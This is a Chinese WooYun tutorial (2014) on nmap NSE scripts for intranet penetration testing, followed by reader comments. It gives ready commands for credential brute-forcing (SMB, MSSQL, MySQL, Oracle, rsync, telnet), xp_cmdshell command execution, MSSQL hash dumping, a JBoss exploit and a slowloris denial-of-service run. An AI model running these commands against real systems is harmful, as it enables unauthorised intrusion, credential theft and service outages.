<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">nmap脚本使用总结</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">clzzy</a> <span class="bull">·</span> <time title="2014/06/08 11:24" ui-time="" datetime="2014/06/08 11:24" class="published ng-binding ng-isolate-scope">2014/06/08 11:24</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 前言：</h2><hr><p>nmap的基本介绍和基本使用方法，在乌云知识库中已经有人提交过，讲的比较详细，在此文中就不再讲述。 具体链接：<a href="http://drops.wooyun.org/tips/2002">http://drops.wooyun.org/tips/2002</a></p><p>本文主要讲解nmap的众多脚本的使用，在内网渗透的时候尤其好用。</p><h2>0x01 nmap按脚本分类扫描</h2><hr><p>nmap脚本主要分为以下几类，在扫描时可根据需要设置--script=类别这种方式进行比较笼统的扫描：</p><hr><pre><code>auth: 负责处理鉴权证书（绕开鉴权）的脚本  
broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  
brute: 提供暴力破解方式，针对常见的应用如http/snmp等  
default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  
discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  
dos: 用于进行拒绝服务攻击  
exploit: 利用已知的漏洞入侵系统  
external: 利用第三方的数据库或资源，例如进行whois解析  
fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  
malware: 探测目标机是否感染了病毒、开启了后门等信息  
safe: 此类与intrusive相反，属于安全性脚本  
version: 负责增强服务与版本扫描（Version Detection）功能的脚本  
vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067
</code></pre><p>部分使用截图：</p><p>（1） <code>nmap --script=auth 192.168.137.*</code></p><p>负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p><p><img alt="2014060615534754396.jpg" img-src="a00b1e40c6e0cf088bcea2daa64ee17d3023199b.jpg"></p><p><img alt="2014060615542724331.jpg" img-src="fdc62335814345c755f4d22cb20e9971aee0c4d0.jpg"></p><p>（2）<code>nmap --script=brute 192.168.137.*</code></p><p>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</p><p><img alt="2014060615563891852.jpg" img-src="eb260429adf15f0ce876d1b9531cb6d1e3e0c84b.jpg"></p><p>（3）<code>nmap --script=default 192.168.137.*</code> 或者 <code>nmap -sC 192.168.137.*</code></p><p>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p><p><img alt="2014060615573246791.jpg" img-src="d11fb959013aa3cc29109845bb0992fdf95393ef.jpg"></p><p><img alt="2014060615575272523.jpg" img-src="f5b137d6dfd9dd7099f9aaee782543e77d7bb767.jpg"></p><p>（4）<code>nmap --script=vuln 192.168.137.*</code></p><p>检查是否存在常见漏洞</p><p><img alt="enter image description here" img-src="a1ca32d742136ac3105fbe6b3e0ca5532d62298e.jpg"></p><p><img alt="2014060615591092492.jpg" img-src="717acae30634b2d5910ffcc557d983606b0e1550.jpg"></p><p><img alt="2014060615595719894.jpg" img-src="69d3ddf0517880a275d134524764f46826fbd590.jpg"></p><p>（5）<code>nmap -n -p445 --script=broadcast 192.168.137.4</code></p><p>在局域网内探查更多服务开启状况</p><p><img alt="enter image description here" img-src="8fa5dc69fb207d864ea56d335645ad84e3a08b50.jpg"></p><p>（6）<code>nmap --script external 202.103.243.110</code></p><p>利用第三方的数据库或资源，例如进行whois解析</p><p><img alt="enter image description here" img-src="ff1c7f7e83dfc5719cb8280a7bb8e67bd6ded193.jpg"></p><h2>0x02 nmap按应用服务扫描</h2><hr><p>（1）vnc扫描：</p><p>检查vnc bypass</p><pre><code>#!bash
nmap  --script=realvnc-auth-bypass 192.168.137.4  
</code></pre><p><img alt="2014060616053748232.jpg" img-src="4e2676089a94a0411fc5df91aae21a36d55054ed.jpg"></p><p><img alt="2014060616051988850.jpg" img-src="75d8c2ca256d691086e0aa73bf3c950a6b1904ea.jpg"></p><p>检查vnc认证方式</p><pre><code>#!bash
nmap  --script=vnc-auth  192.168.137.4  
</code></pre><p>获取vnc信息</p><pre><code>#!bash
nmap  --script=vnc-info  192.168.137.4  
</code></pre><p>（2）smb扫描：</p><p>smb破解</p><pre><code>#!bash
nmap  --script=smb-brute.nse 192.168.137.4  
</code></pre><p>smb字典破解</p><pre><code>#!bash
nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4  
</code></pre><p><img alt="enter image description here" img-src="46c1616168d5b7e3535c7045df6f84106132f331.jpg"></p><p>smb已知几个严重漏</p><pre><code>#!bash
nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4    
</code></pre><p><img alt="2014060616100977307.jpg" img-src="3fc8697141d2b76073d145b5f19cf3d065ed1baf.jpg"></p><p>查看共享目录</p><pre><code>#!bash
nmap -p 445  --script smb-ls --script-args ‘share=e$,path=\,smbuser=test,smbpass=test’ 192.168.137.4    
</code></pre><p>查询主机一些敏感信息（注：需要下载nmap_service）</p><pre><code>#!bash
nmap -p 445 -n –script=smb-psexec --script-args= smbuser=test,smbpass=test 192.168.137.4   
</code></pre><p><img alt="enter image description here" img-src="2bb9a0d5b0e26f33df8d276edfbfc1712ad099b4.jpg"></p><p>查看会话</p><pre><code>#!bash
nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=test,smbpass=test 192.168.137.4    
</code></pre><p>系统信息</p><pre><code>#!bash
nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=test,smbpass=test 192.168.137.4  
</code></pre><p>（3）Mssql扫描：</p><p>猜解mssql用户名和密码</p><pre><code>#!bash
nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4    
</code></pre><p><img alt="2014060616135770347.jpg" img-src="18682644f7d791034b85e5e3ac7b1cbc8cda0425.jpg"></p><p>xp_cmdshell 执行命令</p><pre><code>#!bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4       
</code></pre><p><img alt="2014060616145120758.jpg" img-src="d35564abffa339fa3323d11db4332a97d99a679a.jpg"></p><p>dumphash值</p><pre><code>#!bash
nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4      
</code></pre><p><img alt="enter image description here" img-src="a2576a69359686c215a306f203f7ae1344593538.jpg"></p><p>（4）Mysql扫描：</p><p>扫描root空口令</p><pre><code>#!bash
nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4   
</code></pre><p><img alt="enter image description here" img-src="a26fbfa08f8e697ed85ac322b4dd2ec2568e621c.jpg"></p><p>列出所有mysql用户</p><pre><code>#!bash
nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4   
</code></pre><p>支持同一应用的所有脚本扫描</p><pre><code>#!bash
nmap --script=mysql-* 192.168.137.4  
</code></pre><p><img alt="enter image description here" img-src="4725f3ffdc4be304f6c74a057a7c99259d3c84f8.jpg"></p><p>（5）Oracle扫描：</p><p>oracle sid扫描</p><pre><code>#!bash
nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5   
</code></pre><p><img alt="enter image description here" img-src="f762fe3c45553e0bb21604fbe70aa726b58368f8.jpg"></p><p>oracle弱口令破解</p><pre><code>#!bash
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5      
</code></pre><p><img alt="enter image description here" img-src="5f7e27d416f0d215f4706e30e001863fadbafdf3.jpg"></p><p>（6）其他一些比较好用的脚本</p><pre><code>nmap --script=broadcast-netbios-master-browser 192.168.137.4   发现网关  
nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.137.4  破解rsync  
nmap --script informix-brute -p 9088 192.168.137.4    informix数据库破解  
nmap -p 5432 --script pgsql-brute 192.168.137.4       pgsql破解  
nmap -sU --script snmp-brute 192.168.137.4            snmp破解  
nmap -sV --script=telnet-brute 192.168.137.4          telnet破解  
nmap --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' &lt;target&gt;  jboss autopwn  
nmap --script=http-methods.nse 192.168.137.4 检查http方法  
nmap --script http-slowloris --max-parallelism 400 192.168.137.4  dos攻击，对于处理能力较小的站点还挺好用的 'half-HTTP' connections   
nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4
</code></pre><p>（7）不靠谱的脚本：</p><p>vnc-brute    次数多了会禁止连接</p><p>pcanywhere-brute   同上</p><p><img alt="2014060616350538005.jpg" img-src="c4c99c404caf3210347e299a067bcc945cc6e709.jpg"></p><h2>0x03  学会脚本分析</h2><hr><p>nmap中脚本并不难看懂，所以在使用时如果不知道原理可以直接看利用脚本即可，也可以修改其中的某些参数方便自己使用。</p><p>举例：</p><p>关于oracle的弱口令破解：</p><p>调用过程：oracle-brute.nse >> oracle-default-accounts.lst</p><p>首先是调用破解脚本：</p><p><img alt="2014060616383416251.jpg" img-src="95f23c73bb12ecd24cc56076769f881ad8f46ab5.jpg"></p><p>根据脚本中字典的位置去查看默认字典，当然也可以将破解的字符自行添加其中，或者是修改脚本或参数改变破解字典：</p><p><img alt="2014060616385857682.jpg" img-src="ad350a3b0b2dcb997f6dc9aaeff5a3aca4e27564.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/24" rel="bookmark" id="re1">使用Hash直接登录Windows</a></li><li><a href="http://drops.wooyun.org/tips/8660" rel="bookmark" id="re2">WireShark黑客发现之旅（5）—扫描探测</a></li><li><a href="http://drops.wooyun.org/tips/4333" rel="bookmark" id="re3">Nmap速查手册</a></li><li><a href="http://drops.wooyun.org/tips/8594" rel="bookmark" id="re4">工控安全入门分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">哈哈哈</span> <span class="reply-time">2016-06-03 06:00:29</span></div><p></p><p>嘿嘿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">islx</span> <span class="reply-time">2016-06-03 05:58:48</span></div><p></p><p>嘿嘿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">islx</span> <span class="reply-time">2016-03-28 10:04:35</span></div><p></p><p>感谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">vforbox</span> <span class="reply-time">2016-01-17 14:38:29</span></div><p></p><p>非常不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark0smith</span> <span class="reply-time">2016-01-07 13:56:49</span></div><p></p><p>大大的赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">marshal</span> <span class="reply-time">2015-03-04 15:59:49</span></div><p></p><p>这篇可以参考： http://blog.csdn.net/nixawk/article/details/39701019</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">7z1</span> <span class="reply-time">2014-12-19 01:08:51</span></div><p></p><p>在内网，常用Nmap测试各种服务，很棒~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wocacaca</span> <span class="reply-time">2014-12-14 15:47:41</span></div><p></p><p>有个关于http-brute的脚本想问你，能给个联系方式么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2014-10-15 00:07:58</span></div><p></p><p>挺感谢的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2014-07-24 21:19:14</span></div><p></p><p>前提要会python</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lovepim</span> <span class="reply-time">2014-07-16 17:01:41</span></div><p></p><p>楼主有没有Linux下不用安装的nmap，传上去就能用？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Whysec</span> <span class="reply-time">2014-06-27 17:39:23</span></div><p></p><p>挺感谢的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abcdlzy</span> <span class="reply-time">2014-06-13 13:41:09</span></div><p></p><p>桂电的前辈学长么0 0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-06-09 23:33:04</span></div><p></p><p>不要在躲藏了，你是那么的耀眼，<br>说，是不是桂林电大的！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌贼NO.1</span> <span class="reply-time">2014-06-09 13:01:57</span></div><p></p><p>楼主把常用的脚本都总结好了，其他脚本使用方法可以去http://nmap.org/nsedoc/ 查看</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ver007</span> <span class="reply-time">2014-06-09 10:52:55</span></div><p></p><p>主要是太多不好列 希望一起整理 嘿嘿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-06-09 10:44:05</span></div><p></p><p>赞~ 建议按照http://drops.wooyun.org/tips/143手册方式一个一个列出来介绍会更好一些，也便于检索。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">clzzy</span> <span class="reply-time">2014-06-08 22:51:57</span></div><p></p><p>这个可以留给大神来写</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">clzzy</span> <span class="reply-time">2014-06-08 20:35:39</span></div><p></p><p>哈哈，在总结的过程中也参考过，是我写的失误，应该后面标注下参考的文章的！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ver007</span> <span class="reply-time">2014-06-08 18:13:36</span></div><p></p><p>http://pan.baidu.com/share/link?shareid=4172182310&amp;uk=1879982190</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ver007</span> <span class="reply-time">2014-06-08 18:12:33</span></div><p></p><p>百度：nmap script 使用帮助</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ver007</span> <span class="reply-time">2014-06-08 18:11:50</span></div><p></p><p>为什么我整理的nmap script 中文帮助手册 没人去下载尼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-06-08 13:40:27</span></div><p></p><p>收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">z7y</span> <span class="reply-time">2014-06-08 13:31:33</span></div><p></p><p>太强大了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">malayke</span> <span class="reply-time">2014-06-08 12:56:55</span></div><p></p><p>NMAP太强大了，下次再讲讲编写NMAP的NSE脚本更好啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-06-08 11:59:05</span></div><p></p><p>内网渗透Nmap是必备神器啊~</p><p></p></div></div></div></div></div></main>